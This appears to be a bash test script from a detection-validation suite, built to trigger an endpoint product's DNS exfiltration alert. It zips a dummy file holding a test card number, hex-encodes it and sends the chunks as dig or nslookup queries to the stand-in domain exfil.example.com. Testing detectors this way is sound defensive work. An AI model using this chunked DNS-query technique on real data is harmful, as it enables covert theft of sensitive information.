#!/bin/bash
# 12 - DNS Exfiltration
# Trigger: ExfilViaDNSRequest IOA
# Tactic: Exfiltration / Exfiltration Over Alternative Protocol
set -e
echo "=== [12] DNS Exfiltration ==="

# Create test data
echo "SENSITIVE_DATA_credit_card_4111111111111111" > /tmp/exfil_data.txt

# Compress and encode
zip -j /tmp/exfil.zip /tmp/exfil_data.txt 2>/dev/null || true

# Convert to hex and exfiltrate via DNS queries
# Using TEST-NET domain (won't resolve, but DNS query is the trigger)
if command -v xxd &>/dev/null && command -v dig &>/dev/null; then
    ENCODED=$(xxd -p /tmp/exfil.zip 2>/dev/null | head -c 60)
    # Split into DNS-safe chunks and query
    for i in $(seq 0 30 ${#ENCODED}); do
        CHUNK="${ENCODED:$i:30}"
        if [ -n "$CHUNK" ]; then
            dig +short "${CHUNK}.exfil.example.com" A 2>/dev/null || true
        fi
    done
else
    # Fallback: use nslookup
    nslookup "data.exfil.example.com" 2>/dev/null || true
fi

# Cleanup
rm -f /tmp/exfil_data.txt /tmp/exfil.zip 2>/dev/null || true

echo "[12] Done — ExfilViaDNSRequest IOA should trigger"
